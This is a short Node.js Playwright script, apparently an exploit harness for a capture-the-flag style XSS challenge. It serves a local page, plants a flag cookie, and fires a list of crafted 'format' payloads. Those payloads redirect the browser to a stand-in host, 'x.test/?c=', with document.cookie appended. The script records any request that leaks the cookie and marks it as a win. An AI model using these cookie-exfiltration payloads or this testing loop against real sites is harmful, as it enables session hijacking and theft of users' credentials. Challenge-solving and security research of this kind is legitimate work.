const http=require("http"),fs=require("fs"),path=require("path");
const {chromium}=require("playwright");
const SITE=path.join(__dirname,"site"),PORT=8099,COOKIE="FLAGMARK_abc123";
const server=http.createServer((req,res)=>{let p=decodeURIComponent(req.url.split("?")[0]);if(p==="/")p="/index.html";fs.readFile(path.join(SITE,p),(e,d)=>{if(e){res.writeHead(200,{"Content-Type":"text/html"});return res.end(fs.readFileSync(path.join(SITE,"index.html")));}const x=path.extname(p);res.writeHead(200,{"Content-Type":x===".js"?"text/javascript":x===".css"?"text/css":"text/html"});res.end(d);});});
const q=o=>Object.entries(o).map(([k,v])=>k+"="+encodeURIComponent(v)).join("&");
(async()=>{
  await new Promise(r=>server.listen(PORT,r));
  const browser=await chromium.launch();
  const ctx=await browser.newContext();
  await ctx.addCookies([{name:"flag",value:COOKIE,url:`http://localhost:${PORT}`,httpOnly:false}]);
  async function test(format,formula){
    const page=await ctx.newPage();const eg=[];
    page.on("dialog",d=>{eg.push("DLG:"+d.message().slice(0,90));d.dismiss().catch(()=>{});});
    await page.route("**",r=>{const u=r.request().url();if(u.startsWith(`http://localhost:${PORT}`))return r.continue();eg.push(u.slice(0,200));return r.abort();});
    const url=`http://localhost:${PORT}/?`+q({x:"1",y:"2",formula:formula||"x + y",format,autoEval:"1"});
    try{await page.goto(url,{waitUntil:"domcontentloaded",timeout:8000});}catch(e){}
    await page.waitForTimeout(800);
    let a="";try{a=await page.$eval("#answer",e=>e.textContent);}catch(e){a="(nav)";}
    await page.close();
    return {format,answer:(a||"").slice(0,35),eg,win:eg.some(e=>e.includes(COOKIE))};
  }
  const B="http://x.test/?c=";
  const P=[
    `,[location="${B}"+document.cookie]`,
    `,[location="${B}"+document[c]]`,
    `,[location=document.cookie]`,
    `,[location="${B}",document.cookie]`,
    `,[location="${B}"i]`,
    // multi-attr index trick with cookie
    `,[name="${B}"][location=document.cookie]`,
    // location.href / assign via array (dot in name -> invalid, confirm)
    `,[location.href="${B}"]`,
    // template-ish
    `,[location=\`${B}\`]`,
  ];
  console.log("== concat-in-array tests ==");
  for(const f of P){const r=await test(f,null);console.log((r.win?"WIN ":"    ")+JSON.stringify(r));}
  await browser.close();server.close();
})();
